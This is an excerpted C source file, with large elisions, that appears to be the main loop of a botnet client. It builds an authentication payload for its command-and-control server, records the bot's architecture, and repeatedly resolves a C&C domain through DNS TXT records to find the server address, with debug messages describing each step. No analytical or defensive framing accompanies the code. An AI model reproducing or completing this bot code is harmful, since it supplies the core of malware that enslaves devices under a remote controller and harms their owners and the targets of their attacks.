...
int main(int argc, char **args)
{
	...
	//struct sysinfo info;
	//sysinfo(&info);
	//uint16_t free_ram = info.freeram / 1024 / 1024;
	struct entry *ptr;
	uint8_t p = 0;
	BOOL c = FALSE;
	int i = 0;
	...
	// Build the authentication payload relayed back to the command & control server
	auth.a = htons(128);
	auth.b = htons(90);
	auth.c = htons(87);
	auth.d = htons(200);
	...
	#ifdef BOT_ARCH
	util_memcpy(auth.arch_buf, BOT_ARCH, ARCH_LEN);
	#else
    ...
    {
		util_null(auth.arch_buf, 0, 32);
		util_memcpy(auth.arch_buf, args[1], util_strlen(args[1]));
    }
	...
	// Check if we have enough RAM to initlize ourselfs.
	//if(free_ram < MAX_RAM)
	//	return 1;
	...
	#ifdef DEBUG
	printf("We have started under DEBUG mode with name %s!\n", auth.arch_buf);
	#endif
	...
	while(TRUE)
	{
		...
		if(sock == -1)
		{
			ptr = retrieve_entry(ENTRY_CNC_DOMAIN);
			if(!(dns = dns_lookup(ptr->buf, QUERY_TYPE_TXT)))
			{
				#ifdef DEBUG
				printf("Failed to make a DNS query, retrying in 10 seconds...\n");
				#endif
			...
			// Sanity check the length, if it exceeds the maximum IPv4 range, retry some other time
			if(dns->data_len < 1 || dns->data_len > 15)
			{
				#ifdef DEBUG
				printf("Invalid command & control address length retrieved, retrying in 10 seconds\n");
				#endif
				disconnect_connection();
				continue;
			}
			#ifdef DEBUG
			printf("Retrieved command & control address \"%s\", Length %d\n", dns->buf, dns->data_len);
			#endif
